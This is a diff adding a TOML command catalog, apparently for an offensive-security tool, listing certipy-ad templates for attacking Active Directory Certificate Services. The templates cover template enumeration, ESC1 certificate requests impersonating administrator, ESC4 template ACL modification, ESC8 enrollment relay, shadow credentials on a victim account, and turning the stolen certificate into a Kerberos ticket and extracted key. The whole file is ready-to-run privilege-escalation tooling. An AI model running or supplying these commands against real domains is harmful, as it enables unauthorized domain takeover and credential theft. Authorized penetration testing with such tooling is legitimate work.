@@ -1,0 +1,65 @@
+category = "adcs"
+display_name = "ADCS"
+icon = "󰒃"
+order = 50
+
+[[command]]
+id = "adcs.certipy.find"
+title = "certipy find — enumerate templates + CAs"
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -text -output ca_findings"
+requires = ["certipy-ad"]
+tags = ["enum"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "adcs.certipy.find_vulnerable"
+title = "certipy find -vulnerable"
+template = "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc} -vulnerable -stdout"
+requires = ["certipy-ad"]
+tags = ["enum", "vulnerable"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "adcs.certipy.esc1"
+title = "certipy ESC1 — request cert as SAN"
+template = "certipy-ad req -u '{user}@{domain}' -p '{password}' -ca CA_NAME -template TEMPLATE_NAME -upn administrator@{domain}"
+requires = ["certipy-ad"]
+tags = ["esc1"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "adcs.certipy.esc4"
+title = "certipy ESC4 — modify template ACL"
+template = "certipy-ad template -u '{user}@{domain}' -p '{password}' -template TEMPLATE_NAME -save-old"
+requires = ["certipy-ad"]
+tags = ["esc4"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "adcs.certipy.esc8"
+title = "certipy ESC8 — relay HTTP enrollment"
+template = "certipy-ad relay -target http://{dc} -template DomainController"
+requires = ["certipy-ad"]
+tags = ["esc8", "relay", "noisy"]
+
+[[command]]
+id = "adcs.certipy.auth_with_pfx"
+title = "certipy auth — get TGT from PFX"
+template = "certipy-ad auth -pfx administrator.pfx -dc-ip {dc}"
+requires = ["certipy-ad"]
+tags = ["auth"]
+
+[[command]]
+id = "adcs.certipy.shadow_credentials"
+title = "certipy shadow — add msDS-KeyCredentialLink"
+template = "certipy-ad shadow auto -u '{user}@{domain}' -p '{password}' -account VICTIM"
+requires = ["certipy-ad"]
+tags = ["shadow", "esc14"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "adcs.certipy.cert"
+title = "certipy cert (extract from pfx)"
+template = "certipy-ad cert -pfx administrator.pfx -nocert -out admin.key"
+requires = ["certipy-ad"]
+tags = ["cert"]
